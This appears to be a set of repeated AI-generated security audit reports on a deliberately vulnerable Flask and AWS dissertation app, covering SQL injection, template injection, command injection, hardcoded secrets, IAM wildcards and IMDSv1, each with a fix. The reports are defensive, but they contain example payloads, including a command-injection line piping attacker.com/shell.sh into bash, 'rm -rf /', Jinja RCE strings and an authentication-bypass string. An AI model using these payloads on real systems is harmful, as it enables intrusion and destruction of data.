+### 8. AWS IAM Wildcard Policy (Privilege Escalation)
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** High
+
+The first statement grants unrestricted access to every AWS action and resource:
+
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This renders all subsequent, more restrictive statements meaningless and violates the principle of least privilege. A compromised identity with this policy has full account takeover capability.
+
+**Fix:** Remove the wildcard statement entirely and enumerate only the specific actions required:
+```json
+{
+    "Sid": "AllowRequiredActions",
+    "Effect": "Allow",
+    "Action": [
+        "ec2:DescribeInstances",
+        "s3:GetObject",
+        "s3:ListBucket",
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents"
+    ],
+    "Resource": [
+        "arn:aws:s3:::dissertation-bucket/*",
+        "arn:aws:logs:eu-west-2:ACCOUNT_ID:*"
+    ]
+}
+```
+Also scope `SecretsManagerAccess` to specific secret ARNs and remove `secretsmanager:DeleteSecret` unless explicitly required.
+
+---
+
+### 9. EC2 IMDSv1 Enabled (SSRF to Credential Theft)
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+The EC2 instance allows IMDSv1 (`http_tokens = "optional"`), which does not require session tokens:
+
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "optional"   # IMDSv1 allowed
+}
+```
+
+Combined with any SSRF vulnerability in the application, an attacker can retrieve IAM credentials via `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
+
+**Fix:** Enforce IMDSv2:
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "required"   # IMDSv2 only
+    http_put_response_hop_limit = 1
+}
+```
+
+---
+
+## Medium Severity Vulnerabilities
+
+---
+
+### 10. Debug Mode Enabled in Production Entry Point
+**File:** `./run.py`
+**Severity:** Medium
+
+```python
+app.run(debug=True)
+```
+
+Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python execution in the browser if an exception occurs. It also enables the reloader and exposes detailed tracebacks.
+
+**Fix:**
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+In production, use a proper WSGI server (gunicorn, uWSGI) rather than Flask's development server.
+
+---
+
+### 11. Unencrypted S3 Bucket
+**File:** `./infrastructure/main.tf` — `aws_s3_bucket.unencrypted_bucket`
+**Severity:** Medium
+
+`dissertation-unencrypted-bucket` has no server-side encryption configuration, unlike `secure_bucket`.
+
+**Fix:** Apply encryption to all buckets:
+```hcl
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "AES256"
+    }
+  }
+}
+```
+
+---
+
+### 12. Publicly Accessible S3 Bucket
+**File:** `./infrastructure/main.tf` — `aws_s3_bucket.public_bucket`
+**Severity:** Medium
+
+All four public access block settings are `false`, making this bucket and its contents potentially world-readable:
+
+```hcl
+block_public_acls       = false
+block_public_policy     = false
+ignore_public_acls      = false
+restrict_public_buckets = false
+```
+
+**Fix:** Unless this bucket is intentionally serving public static assets, set all flags to `true`. If public access is required, use CloudFront with an Origin Access Control (OAC) instead of direct bucket access.
+
+---
+
+### 13. No Input Validation on File Upload
+**File:** `./app/routes/files.py` — `upload_file()`
+**Severity:** Medium
+
+The filename is stored without any validation, allowing path traversal sequences or null bytes:
+
+```python
+filename = data.get("filename")   # No validation
+file_record = File(filename=filename, ...)
+```
+
+**Fix:**
+```python
+import re
+from werkzeug.utils import secure_filename
+
+filename = secure_filename(data.get("filename", ""))
+if not filename:
+    return jsonify({"error": "Invalid filename"}), 400
+```
+
+---
+
+### 14. Missing Input Validation on Auth Endpoints
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Medium
+
+No validation is performed on `username`, `password`, or `email` before use. A `None` value (missing JSON field) will cause an unhandled exception, and there are no length or format constraints.
+
+**Fix:**
+```python
+if not username or not password or not email:
+    return jsonify({"error": "All fields are required"}), 400
+if len(password) < 12:
+    return jsonify({"error": "Password too short"}), 400
+if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
+    return jsonify({"error": "Invalid email"}), 400
+```
+
+---
+
+### 15. JWT Algorithm Not Validated on Decode
+**File:** `./app/routes/auth.py` — `generate_token()`
+**Severity:** Medium
+
+The `generate_token` function encodes tokens, but there is no corresponding `decode` function shown that explicitly specifies `algorithms=["HS256"]`. Omitting the `algorithms` parameter on decode historically allowed the `"alg": "none"` attack.
+
+**Fix:** Always specify the algorithm explicitly on decode:
+```python
+payload = jwt.decode(
+    token,
+    os.environ["JWT_SECRET_KEY"],
+    algorithms=["HS256"]   # Must be explicit
+)
+```
+
+---
+
+## Low Severity Vulnerabilities
+
+---
+
+### 16. Sensitive Data Exposure via User Enumeration
+**File:** `./app/routes/users.py` — `get_user()`
+**Severity:** Low
+
+The endpoint returns a distinct `"User not found"` error, enabling username enumeration. The `get_all_users()` endpoint also exposes emails and roles for all users with no authentication.
+
+**Fix:** Require authentication for all user lookup endpoints and return generic error messages where appropriate.
+
+---
+
+### 17. No Rate Limiting
+**Files:** `./app/routes/auth.py`
+**Severity:** Low
+
+Login and registration endpoints have no rate limiting, making them vulnerable to brute-force and credential-stuffing attacks.
+
+**Fix:** Use `flask-limiter`:
+```python
+from flask_limiter import Limiter
+limiter = Limiter(app, key_func=get_remote_address)
+
+@auth_bp.route("/login", methods=["POST"])
+@limiter.limit("10 per minute")
+def login():
+    ...
+```
+
+---
+
+### 18. Outdated Dependencies with Known CVEs
+**File:** `./requirements.txt`
+**Severity:** Low–Medium (version-dependent)
+
+Several pinned versions are outdated and may carry known CVEs:
+
+| Package | Pinned | Notes |
+|---|---|---|
+| `Werkzeug` | `2.0.0` | Multiple CVEs fixed in later 2.x/3.x releases |
+| `Jinja2` | `3.0.0` | CVEs fixed in 3.1.x |
+| `urllib3` | `1.26.20` | 2.x branch has security improvements |
+| `requests` | `2.28.0` | Outdated |
+
+**Fix:** Run `pip audit` or use Dependabot/Renovate to identify and update vulnerable packages. Pin to the latest stable versions and integrate automated dependency scanning into CI.
+
+---
+
+## Summary Table
+
+| # | Issue | File | Severity |
+|---|---|---|---|
+| 1 | SQL Injection | `auth.py` | **Critical** |
+| 2 | Server-Side Template Injection (RCE) | `templates.py` | **Critical** |
+| 3 | Plaintext Password Storage | `auth.py` | **Critical** |
+| 4 | OS Command Injection | `files.py` | **Critical** |
+| 5 | Hardcoded Secrets |
+
+=== RUN 4 ===
+# Security Audit Report
+
+## Critical Vulnerabilities
+
+---
+
+### 1. SQL Injection
+**File:** `./app/routes/auth.py` — `login()` function
+**Severity:** Critical
+
+The login query is built via direct string concatenation with unsanitised user input, allowing an attacker to manipulate the query logic entirely.
+
+```python
+# VULNERABLE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+An attacker can bypass authentication entirely with a username like `' OR '1'='1' --`, or exfiltrate/destroy data.
+
+**Fix:** Use SQLAlchemy's ORM or parameterised queries:
+```python
+# Option 1: ORM (preferred)
+user = User.query.filter_by(username=username).first()
+if user and check_password_hash(user.password, password):
+    ...
+
+# Option 2: Parameterised query
+result = db.session.execute(
+    "SELECT * FROM users WHERE username = :username AND password = :password",
+    {"username": username, "password": password}
+)
+```
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+**File:** `./app/routes/templates.py` — `render_template_custom()`
+**Severity:** Critical
+
+User-supplied template strings are rendered directly by Jinja2 with no sandboxing, allowing arbitrary code execution on the server.
+
+```python
+# VULNERABLE — attacker controls template_str entirely
+env = Environment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+
+A payload such as `{{ ''.__class__.__mro__[1].__subclasses__() }}` or `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` achieves Remote Code Execution (RCE).
+
+**Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist templates. Better still, avoid rendering arbitrary user-supplied templates entirely:
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+Note: Even `SandboxedEnvironment` has had bypasses. The safest approach is to never render user-controlled templates.
+
+---
+
+### 3. OS Command Injection
+**File:** `./app/routes/files.py` — `process_file()`
+**Severity:** Critical
+
+User-supplied `filename` is concatenated directly into a shell command executed with `shell=True`:
+
+```python
+# VULNERABLE
+result = subprocess.run(
+    "file " + filename,   # attacker controls filename
+    shell=True,
+    capture_output=True,
+    text=True
+)
+```
+
+An attacker submitting `filename = "foo; rm -rf / #"` or `"foo && curl attacker.com/shell.sh | bash"` achieves arbitrary command execution.
+
+**Fix:** Pass arguments as a list and disable shell interpolation:
+```python
+import shlex
+
+# Validate filename first
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+
+result = subprocess.run(
+    ["file", filename],   # list form — no shell expansion
+    shell=False,
+    capture_output=True,
+    text=True
+)
+```
+
+---
+
+## High Vulnerabilities
+
+---
+
+### 4. Plaintext Password Storage
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** High
+
+Passwords are stored in the database as plaintext:
+
+```python
+# VULNERABLE
+user = User(username=username, password=password, email=email)
+```
+
+A database breach exposes every user's password directly.
+
+**Fix:** Hash passwords with a strong, salted algorithm before storage:
+```python
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# On registration
+user = User(username=username, password=generate_password_hash(password), email=email)
+
+# On login
+if user and check_password_hash(user.password, password):
+    ...
+```
+
+---
+
+### 5. Hardcoded Secrets
+**Files:** `./app/config.py`, `./app/routes/auth.py`
+**Severity:** High
+
+Multiple secrets are hardcoded directly in source code:
+
+```python
+# app/config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# app/routes/auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+Anyone with access to the repository (including version control history) has these credentials permanently.
+
+**Fix:** Load all secrets from environment variables or a secrets manager:
+```python
+import os
+
+class Config:
+    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]
+    JWT_SECRET = os.environ["JWT_SECRET_KEY"]
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+```
+Rotate all currently exposed secrets immediately. Ensure `.env` files are in `.gitignore`.
+
+---
+
+### 6. No Authentication or Authorisation on Any Endpoint
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**Severity:** High
+
+Every route is publicly accessible with no token validation, session check, or role enforcement:
+
+- `DELETE /users/delete/<username>` — anyone can delete any user
+- `GET /users/` — full user list (including emails and roles) exposed publicly
+- `DELETE /files/delete/<file_id>` — anyone can delete any file
+- `POST /templates/render` — unauthenticated RCE vector (see issue #2)
+
+**Fix:** Implement a JWT verification decorator and apply it to all sensitive routes:
+```python
+from functools import wraps
+import jwt
+from flask import request, jsonify
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+        if not token:
+            return jsonify({"error": "Missing token"}), 401
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+# Apply to routes
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_auth
+def delete_user(username):
+    ...
+```
+
+---
+
+### 7. Overly Permissive IAM Policy — Wildcard Administrator Access
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** High
+
+The first statement grants unrestricted access to every AWS action on every resource:
+
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This makes all subsequent, more restrictive statements irrelevant. Any principal with this policy has full account compromise capability.
+
+**Fix:** Remove the wildcard statement entirely and grant only the specific actions required. Apply the principle of least privilege:
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+```
+
+---
+
+### 8. Publicly Accessible S3 Bucket
+**File:** `./infrastructure/main.tf` — `aws_s3_bucket_public_access_block.public_bucket_access`
+**Severity:** High
+
+All four public access block settings are explicitly disabled:
+
+```hcl
+block_public_acls       = false
+block_public_policy     = false
+ignore_public_acls      = false
+restrict_public_buckets = false
+```
+
+This allows the bucket and its contents to be made world-readable/writable.
+
+**Fix:** Unless there is a specific, justified need for public access (e.g., a static website), block all public access:
+```hcl
+block_public_acls       = true
+block_public_policy     = true
+ignore_public_acls      = true
+restrict_public_buckets = true
+```
+
+---
+
+### 9. IMDSv2 Not Enforced on EC2 Instance
+**File:** `./infrastructure/main.tf` — `aws_instance.web_server`
+**Severity:** High
+
+The instance metadata service is configured with `http_tokens = "optional"`, meaning IMDSv1 (unauthenticated) requests are accepted:
+
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "optional"   # IMDSv1 allowed
+}
+```
+
+IMDSv1 is vulnerable to SSRF attacks — if the application has any SSRF vulnerability, an attacker can retrieve the instance's IAM credentials via `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
+
+**Fix:** Require IMDSv2 (token-based):
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "required"   # IMDSv2 only
+    http_put_response_hop_limit = 1
+}
+```
+
+---
+
+## Medium Vulnerabilities
+
+---
+
+### 10. Unencrypted S3 Bucket
+**File:** `./infrastructure/main.tf` — `aws_s3_bucket.unencrypted_bucket`
+**Severity:** Medium
+
+The `dissertation-unencrypted-bucket` bucket has no server-side encryption configuration, unlike `secure_bucket`.
+
+**Fix:** Add an encryption configuration:
+```hcl
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "AES256"
+    }
+  }
+}
+```
+
+---
+
+### 11. SecretsManager Policy Allows `DeleteSecret` on All Resources
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** Medium
+
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Action": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets",
+        "secretsmanager:DeleteSecret"
+    ],
+    "Resource": "*"
+}
+```
+
+`DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account, which could be used for destructive attacks or to force application failures.
+
+**Fix:** Remove `DeleteSecret` from application-facing policies. Scope `Resource` to specific secret ARNs:
+```json
+"Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+```
+
+---
+
+### 12. Debug Mode Enabled in Production Entry Point
+**File:** `./run.py`
+**Severity:** Medium
+
+```python
+app.run(debug=True)
+```
+
+Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python execution in the browser if an exception occurs. It also enables the reloader and exposes detailed tracebacks.
+
+**Fix:**
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+In production, use a proper WSGI server (gunicorn, uWSGI) rather than Flask's built-in server at all.
+
+---
+
+### 13. No Input Validation on File Upload or User Registration
+**Files:** `./app/routes/files.py`, `./app/routes/auth.py`
+**Severity:** Medium
+
+No fields are validated for type, length, format, or content. This enables:
+- Excessively long strings that could cause denial of service or overflow column limits
+- Malformed emails stored without validation
+- Null/missing fields causing unhandled exceptions that leak stack traces
+
+**Fix:** Use a validation library such as `marshmallow` or `pydantic`:
+```python
+from marshmallow import Schema, fields, validate, ValidationError
+
+class RegisterSchema(Schema):
+    username = fields.Str(required=True, validate=validate.Length(min=3, max=80))
+    password = fields.Str(required=True, validate=validate.Length(min=12))
+    email = fields.Email(required=True)
+```
+
+---
+
+### 14. JWT Secret Separate from Flask Secret Key
+**File:** `./app/routes/auth.py`
+**Severity:** Medium
+
+A separate hardcoded JWT secret (`"jwt-secret-key-hardcoded-2024"`) is used instead of the application's `SECRET_KEY`. This creates two independent secrets to manage and rotate, and the JWT secret is buried in a route file rather than in configuration.
+
+**Fix:** Centralise all secrets in `Config` and load from environment variables (see issue #5). Use `current_app.config["SECRET_KEY"]` for JWT signing.
+
+---
+
+## Low Vulnerabilities
+
+---
+
+### 15. Unauthenticated Mass User Enumeration
+**File:** `./app/routes/users.py` — `get_all_users()`
+**Severity:** Low
+
+`GET /users/` returns the full list of all users including usernames, emails, and roles with no authentication required. This facilitates targeted phishing and credential-stuffing attacks.
+
+**Fix:** Require authentication (see issue #6) and restrict this endpoint to admin roles only.
+
+---
+
+### 16. `datetime.datetime.utcnow()` Deprecation
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+`datetime.datetime.utcnow()` is deprecated in Python 3.12+ and returns a naive datetime, which can cause timezone-related bugs in JWT expiry handling.
+
+**Fix:**
+```python
+from datetime import datetime, timezone, timedelta
+"exp": datetime.now(tz=timezone.utc) + timedelta(hours=24)
+```
+
+---
+
+## Summary Table
+
+| # | File | Issue | Severity |
+|---|------|-------|----------|
+| 1 | `auth.py` | SQL Injection in login | **Critical** |
+| 2 | `templates.py` | Server-Side Template Injection (RCE) | **Critical** |
+| 3 | `files.py` | OS Command Injection | **Critical** |
+| 4 | `auth.py` | Plaintext password storage | **High** |
+| 5 | `config.py`, `auth.py` | Hardcoded secrets | **High** |
+| 6 | All routes | No authentication or authorisation | **High** |
+| 7 | `iam-policy.json` | Wildcard IAM administrator access | **High** |
+| 8 | `main.tf` | Public S3 bucket | **High** |
+| 9 | `main.tf` | IMDSv1 enabled (SSRF risk) | **High** |
+| 10 | `main.tf` | Unencrypted S3 bucket | Medium |
+| 11 | `iam-policy.json` | `DeleteSecret` on all resources | Medium |
+| 12 | `run.py` | Debug mode in production | Medium |
+| 13 | `files.py`, `auth.py` | No input validation | Medium |
+| 14 | `auth.py` | Separate hardcoded JWT secret | Medium |
+| 15 | `users.py` | Unauthenticated user enumeration | Low |
+| 16 | `auth.py` | Deprecated `utcnow()` | Low |
+
+**Immediate priorities:** Issues 1–3 allow unauthenticated remote code execution or full authentication bypass and must be remediated before any further deployment. Issues 4–9 should follow in the same sprint.
+
+=== RUN 5 ===
+# Security Audit Report
+
+## Critical Vulnerabilities
+
+---
+
+### 1. SQL Injection
+**File:** `./app/routes/auth.py` — `login()` function
+**Severity:** Critical
+
+```python
+# VULNERABLE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.
+
+**Fix:** Use parameterised queries:
+```python
+from sqlalchemy import text
+
+user = User.query.filter_by(username=username, password=password).first()
+# OR with raw SQL:
+result = db.session.execute(
+    text("SELECT * FROM users WHERE username = :username AND password = :password"),
+    {"username": username, "password": password}
+)
+```
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+**File:** `./app/routes/templates.py` — `render_template_custom()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+env = Environment()
+template = env.from_string(template_str)  # User-controlled input
+rendered = template.render(**context)
+```
+
+An attacker can execute arbitrary code on the server. For example, submitting:
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+```
+
+**Fix:** Never render user-supplied strings as Jinja2 templates. If templating is required, use a strict sandbox and whitelist approach:
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()  # Restricts access to dangerous attributes
+# Additionally, validate/whitelist allowed template constructs
+```
+Ideally, avoid this pattern entirely and use predefined templates with user-supplied data only as context variables.
+
+---
+
+### 3. OS Command Injection
+**File:** `./app/routes/files.py` — `process_file()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+result = subprocess.run(
+    "file " + filename,  # User-controlled
+    shell=True,          # Shell interpretation enabled
+    capture_output=True,
+    text=True
+)
+```
+
+`shell=True` with unsanitised input allows arbitrary command execution. A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` would be executed by the shell.
+
+**Fix:** Pass arguments as a list and disable shell interpretation:
+```python
+import shlex
+
+# Validate filename first
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+
+result = subprocess.run(
+    ["file", filename],  # List form, no shell expansion
+    shell=False,
+    capture_output=True,
+    text=True
+)
+```
+
+---
+
+### 4. Plaintext Password Storage
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+user = User(username=username, password=password, email=email)
+```
+
+Passwords are stored in plaintext in the database. A database breach exposes all user credentials immediately.
+
+**Fix:** Use a strong, salted hashing algorithm:
+```python
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# On registration:
+user = User(username=username, password=generate_password_hash(password), email=email)
+
+# On login:
+if user and check_password_hash(user.password, password):
+    ...
+```
+
+---
+
+## High Severity Vulnerabilities
+
+---
+
+### 5. Hardcoded Secrets
+**Files:** `./app/config.py`, `./app/routes/auth.py`
+**Severity:** High
+
+```python
+# config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+Secrets committed to source control are permanently exposed in version history, even if later removed.
+
+**Fix:** Load all secrets from environment variables:
+```python
+import os
+
+class Config:
+    SECRET_KEY = os.environ.get("SECRET_KEY")
+    if not SECRET_KEY:
+        raise RuntimeError("SECRET_KEY environment variable not set")
+
+# In auth.py:
+def generate_token(user_id):
+    secret = os.environ.get("JWT_SECRET_KEY")
+    ...
+```
+Use a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault) in production.
+
+---
+
+### 6. Overly Permissive IAM Policy — Wildcard Admin
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** High
+
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This grants full administrative access to all AWS services and resources, violating the principle of least privilege. The subsequent, more specific statements are entirely redundant.
+
+**Fix:** Remove the wildcard statement and grant only the specific permissions required:
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        }
+        // ... only other explicitly needed permissions
+    ]
+}
+```
+
+---
+
+### 7. Missing Authentication on All Endpoints
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`
+**Severity:** High
+
+```python
+# No authentication decorator on any route
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+def delete_user(username):
+    ...  # Anyone can delete any user
+
+@files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
+def delete_file(file_id):
+    ...  # Anyone can delete any file
+```
+
+All endpoints are publicly accessible with no authentication or authorisation checks.
+
+**Fix:** Implement a JWT verification decorator and apply it to protected routes:
+```python
+from functools import wraps
+import jwt
+from flask import request, jsonify
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").replace("Bearer ", "")
+        if not token:
+            return jsonify({"error": "Unauthorised"}), 401
+        try:
+            payload = jwt.decode(token, os.environ.get("JWT_SECRET_KEY"), algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_auth
+def delete_user(username):
+    ...
+```
+
+---
+
+### 8. IMDS v1 Enabled on EC2 Instance (SSRF Risk)
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "optional"  # Allows IMDSv1
+    http_put_response_hop_limit = 1
+}
+```
+
+`http_tokens = "optional"` permits IMDSv1, which does not require a session token. If the application is vulnerable to SSRF, an attacker can reach `http://169.254.169.254/` and retrieve IAM credentials without any additional authentication step.
+
+**Fix:** Enforce IMDSv2:
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "required"  # IMDSv2 only
+    http_put_response_hop_limit = 1
+}
+```
+
+---
+
+### 9. Publicly Accessible S3 Bucket
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+    block_public_acls       = false
+    block_public_policy     = false
+    ignore_public_acls      = false
+    restrict_public_buckets = false
+}
+```
+
+All four public access block settings are disabled, making the bucket and its contents potentially world-readable.
+
+**Fix:** Unless serving a static public website with intentionally public content, enable all four settings:
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+    block_public_acls       = true
+    block_public_policy     = true
+    ignore_public_acls      = true
+    restrict_public_buckets = true
+}
+```
+
+---
+
+### 10. Unencrypted S3 Bucket
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+resource "aws_s3_bucket" "unencrypted_bucket" {
+    bucket = "dissertation-unencrypted-bucket"
+}
+# No encryption configuration attached
+```
+
+Data at rest is stored without encryption, violating most compliance frameworks (PCI-DSS, HIPAA, GDPR).
+
+**Fix:**
+```hcl
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+    bucket = aws_s3_bucket.unencrypted_bucket.id
+    rule {
+        apply_server_side_encryption_by_default {
+            sse_algorithm = "aws:kms"  # Prefer KMS over AES256 for key management
+        }
+    }
+}
+```
+
+---
+
+## Medium Severity Vulnerabilities
+
+---
+
+### 11. Debug Mode Enabled in Production Entry Point
+**File:** `./run.py`
+**Severity:** Medium
+
+```python
+app.run(debug=True)
+```
+
+Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python code execution via the browser if an exception occurs. It also enables the auto-reloader and exposes detailed stack traces.
+
+**Fix:**
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+
+---
+
+### 12. No Input Validation on File Upload
+**File:** `./app/routes/files.py` — `upload_file()`
+**Severity:** Medium
+
+```python
+filename = data.get("filename")
+file_record = File(filename=filename, uploaded_by=uploaded_by)
+```
+
+No validation is performed on the filename. This enables path traversal payloads (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+
+**Fix:**
+```python
+import re
+from pathlib import Path
+
+filename = data.get("filename", "")
+# Sanitise: allow only safe characters
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+# Prevent path traversal
+filename = Path(filename).name  # Strips any directory components
+```
+
+---
+
+### 13. Overly Permissive Secrets Manager IAM Action
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** Medium
+
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Action": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets",
+        "secretsmanager:DeleteSecret"  // Destructive action
+    ],
+    "Resource": "*"  // All secrets
+}
+```
+
+`DeleteSecret` on `Resource: "*"` allows the principal to delete any secret in the account. `ListSecrets` on `*` also reveals the existence of all secrets.
+
+**Fix:**
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Effect": "Allow",
+    "Action": [
+        "secretsmanager:GetSecretValue"
+    ],
+    "Resource": "arn:aws:secretsmanager:eu-west-2:ACCOUNT_ID:secret:dissertation/*"
+}
+```
+
+---
+
+### 14. No Input Validation on Registration
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Medium
+
+```python
+data = request.get_json()
+username = data.get("username")
+password = data.get("password")
+email = data.get("email")
+# No null checks, no length limits, no format validation
+user = User(username=username, password=password, email=email)
+```
+
+Missing validation allows null values, excessively long strings (potential DoS), and malformed email addresses to be stored.
+
+**Fix:**
+```python
+if not username or not password or not email:
+    return jsonify({"error": "All fields are required"}), 400
+if len(password) < 12:
+    return jsonify({"error": "Password must be at least 12 characters"}), 400
+if len(username) > 80 or len(email) > 120:
+    return jsonify({"error": "Input too long"}), 400
+import re
+if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
+    return jsonify({"error": "Invalid email format"}), 400
+```
+
+---
+
+### 15. Unauthenticated User Enumeration
+**File:** `./app/routes/users.py`
+**Severity:** Medium
+
+```python
+@users_bp.route("/<username>", methods=["GET"])
+def get_user(username):
+    ...
+    return jsonify({"id": user.id, "username": user.username,
+                    "email": user.email, "role": user.role}), 200
+
+@users_bp.route("/", methods=["GET"])
+def get_all_users():
+    users = User.query.all()
+    ...
+```
+
+Any unauthenticated party can enumerate all usernames, email addresses, and roles, facilitating targeted phishing and privilege escalation attacks.
+
+**Fix:** Apply `@require_auth` to these routes and limit the fields returned based on the requesting user's role.
+
+---
+
+## Low Severity Vulnerabilities
+
+---
+
+### 16. JWT Algorithm Not Validated on Decode
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+The `generate_token` function specifies `HS256`, but there is no corresponding `decode` call in the codebase that explicitly rejects the `none` algorithm or enforces the expected algorithm. If a decode is added later without specifying `algorithms`, it may be vulnerable to the `alg: none` attack.
+
